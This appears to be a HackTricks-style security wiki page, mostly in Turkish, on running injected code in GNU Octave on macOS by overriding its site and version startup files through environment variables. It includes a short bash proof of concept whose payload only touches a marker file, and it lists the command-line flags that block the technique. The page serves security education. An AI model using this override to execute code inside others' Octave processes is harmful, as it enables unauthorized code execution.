# macOS GNU Octave Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave, başlangıç sırasında geçerli Octave komutları içeren çeşitli dosyaları çalıştırır. `OCTAVE_SITE_INITFILE`, site genelindeki başlangıç dosyasını; `OCTAVE_VERSION_INITFILE` ise sürüme özgü başlangıç dosyasını geçersiz kılar ve her iki değişkenin de otomatik yürütmeyi saldırganın okuyabildiği bir dosyaya yönlendirmesine olanak tanır.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```
`--no-init-file` yalnızca `~/.octaverc` gibi kullanıcı dosyalarını atlar; yukarıdaki site-file override işlemini **durdurmaz**. Site files için `--no-site-file`, tüm startup files'ı devre dışı bırakmak için ise `--norc` / `-f` kullanın.<sup>[[2]](#references)</sup>

## References

- [1] [GNU Octave Startup Files](https://docs.octave.org/latest/Startup-Files.html)
- [2] [GNU Octave Command Line Options](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
